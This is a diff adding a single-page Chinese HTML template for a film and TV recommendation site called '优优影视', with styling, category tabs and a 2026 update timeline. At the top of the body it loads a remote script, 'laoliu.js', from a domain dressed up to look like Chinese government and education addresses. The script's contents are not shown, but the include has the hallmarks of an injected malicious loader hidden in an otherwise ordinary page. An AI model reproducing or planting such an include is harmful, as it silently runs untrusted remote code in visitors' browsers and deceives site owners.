@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>优优影视 - 精选影视推荐与在线观看</title>
+<meta name="keywords" content="优优影视, youyouyingshi, 影视推荐, 在线影视" />
+<meta name="description" content="优优影视（youyouyingshi-h5）是一个精选影视推荐站，涵盖院线电影、口碑剧集、治愈动漫、综艺、纪录片与短片，界面清新简洁，移动端自适应。" />
+<style>
+    :root{
+        --mint:#2dd4a7;
+        --mint-deep:#14a67c;
+        --bg:#f6faf8;
+        --card:#ffffff;
+        --ink:#24302c;
+        --muted:#6b7c75;
+        --line:#dceee7;
+    }
+    *{margin:0;padding:0;box-sizing:border-box;}
+    body{
+        background:var(--bg);
+        color:var(--ink);
+        font-family:"PingFang SC","Microsoft YaHei",Arial,sans-serif;
+        line-height:1.8;
+    }
+    a{color:var(--mint-deep);text-decoration:none;}
+
+    /* 顶部留白 */
+    .hero{
+        padding:56px 18px 40px;
+        text-align:center;
+        background:linear-gradient(180deg,#e9faf3,#f6faf8);
+        border-bottom:1px solid var(--line);
+    }
+    .hero h1{
+        font-size:34px;
+        letter-spacing:4px;
+        color:var(--mint-deep);
+    }
+    .hero .slogan{
+        margin-top:10px;
+        font-size:14px;
+        color:var(--muted);
+        letter-spacing:1px;
+    }
+    .hero .url{
+        margin-top:6px;
+        font-size:12px;
+        color:#93aaa2;
+    }
+
+    /* 导航 */
+    .nav{
+        display:flex;
+        flex-wrap:wrap;
+        gap:8px;
+        justify-content:center;
+        padding:16px 12px;
+        background:var(--card);
+        border-bottom:1px solid var(--line);
+    }
+    .nav a{
+        padding:8px 16px;
+        border-radius:8px;
+        background:var(--bg);
+        font-size:14px;
+        color:var(--ink);
+    }
+    .nav a:hover{
+        background:var(--mint);
+        color:#fff;
+    }
+
+    .wrap{
+        max-width:960px;
+        margin:auto;
+        padding:22px 16px 40px;
+    }
+
+    .sec-title{
+        font-size:19px;
+        margin:26px 0 14px;
+        color:var(--ink);
+    }
+    .sec-title::before{
+        content:"❖";
+        color:var(--mint);
+        margin-right:6px;
+    }
+
+    /* 时间轴 */
+    .timeline{
+        list-style:none;
+        border-left:2px dashed var(--mint);
+        padding-left:18px;
+    }
+    .timeline li{
+        position:relative;
+        margin-bottom:16px;
+    }
+    .timeline li::before{
+        content:"";
+        position:absolute;
+        left:-25px;top:8px;
+        width:12px;height:12px;
+        background:var(--mint);
+        border-radius:50%;
+    }
+    .timeline b{
+        color:var(--mint-deep);
+        font-size:14px;
+    }
+    .timeline span{
+        display:block;
+        font-size:14px;
+        color:var(--ink);
+    }
+
+    /* 左图右文流 */
+    .feed{
+        display:grid;
+        grid-template-columns:100px 1fr;
+        gap:14px;
+        background:var(--card);
+        border:1px solid var(--line);
+        border-radius:12px;
+        padding:14px;
+        margin-bottom:12px;
+        align-items:center;
+    }
+    .feed .thumb{
+        width:100px;height:70px;
+        background:linear-gradient(135deg,var(--mint),#a8f0d8);
+        border-radius:8px;
+    }
+    .feed b{font-size:15px;}
+    .feed p{font-size:13px;color:var(--muted);}
+
+    /* 标签页 */
+    .tabs{
+        display:flex;
+        flex-wrap:wrap;
+        gap:8px;
+    }
+    .tab{
+        padding:8px 14px;
+        background:var(--card);
+        border:1px solid var(--line);
+        border-radius:8px;
+        font-size:13px;
+    }
+    .tab.on{
+        background:var(--mint);
+        color:#fff;
+        border-color:var(--mint);
+    }
+
+    /* 页脚 */
+    .foot{
+        text-align:center;
+        padding:20px;
+        font-size:13px;
+        color:var(--muted);
+        background:var(--card);
+        border-top:1px solid var(--line);
+    }
+
+    @media (max-width:560px){
+        .hero h1{font-size:26px;letter-spacing:2px;}
+        .feed{grid-template-columns:1fr;}
+        .feed .thumb{width:100%;height:90px;}
+    }
+</style>
+</head>
+
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="hero">
+    <h1>优优影视</h1>
+    <div class="slogan">精选好片 · 轻松发现 · 随时观看</div>
+    <div class="url">https://youyouyingshi-h5.github.io</div>
+</header>
+
+<nav class="nav">
+    <a href="#">首页</a>
+    <a href="#">院线电影</a>
+    <a href="#">口碑剧集</a>
+    <a href="#">治愈动漫</a>
+    <a href="#">综艺娱乐</a>
+    <a href="#">纪录片</a>
+</nav>
+
+<main class="wrap">
+
+    <h2 class="sec-title">本周精选</h2>
+    <article class="feed">
+        <div class="thumb"></div>
+        <div>
+            <b>院线热映</b>
+            <p>优优影视精选近期口碑佳片，覆盖动作、剧情、喜剧等类型。</p>
+        </div>
+    </article>
+    <article class="feed">
+        <div class="thumb"></div>
+        <div>
+            <b>追剧日历</b>
+            <p>整理热门剧集更新时间，不错过每一集精彩内容。</p>
+        </div>
+    </article>
+    <article class="feed">
+        <div class="thumb"></div>
+        <div>
+            <b>治愈番单</b>
+            <p>适合放松的动漫与短片，轻量观看、节奏舒适。</p>
+        </div>
+    </article>
+
+    <h2 class="sec-title">更新年表</h2>
+    <ul class="timeline">
+        <li><b>2026 秋季</b><span>新增院线电影与口碑剧集专区</span></li>
+        <li><b>2026 夏季</b><span>上线治愈动漫与短片合集</span></li>
+        <li><b>2026 春季</b><span>优化移动端布局与页面加载速度</span></li>
+        <li><b>2026 年初</b><span>优优影视单页站点正式上线</span></li>
+    </ul>
+
+    <h2 class="sec-title">内容分类</h2>
+    <div class="tabs">
+        <a class="tab on" href="#">院线电影</a>
+        <a class="tab" href="#">口碑剧集</a>
+        <a class="tab" href="#">治愈动漫</a>
+        <a class="tab" href="#">综艺娱乐</a>
+        <a class="tab" href="#">纪录片</a>
+        <a class="tab" href="#">短片</a>
+    </div>
+
+    <h2 class="sec-title">关于优优影视</h2>
+    <article class="feed" style="grid-template-columns:1fr;">
+        <div>
+            <b>站点简介</b>
+            <p>
+                优优影视（youyouyingshi-h5）是一个精选影视推荐站，
+                以“发现好片”为核心，覆盖电影、剧集、动漫、综艺、纪录片与短片，
+                页面轻量、结构清晰，适合移动端浏览与搜索引擎收录。
+            </p>
+        </div>
+    </article>
+
+    <h2 class="sec-title">访问说明</h2>
+    <article class="feed" style="grid-template-columns:1fr;">
+        <div>
+            <b>官方地址</b>
+            <p>https://youyouyingshi-h5.github.io</p>
+            <p>本站为单页结构，所有内页链接以 # 占位，移动端自动适配。</p>
+        </div>
+    </article>
+
+</main>
+
+<footer class="foot">
+    © 2026 优优影视 · youyouyingshi-h5.github.io · 单页精选模板
+</footer>
+
+</body>
+</html>
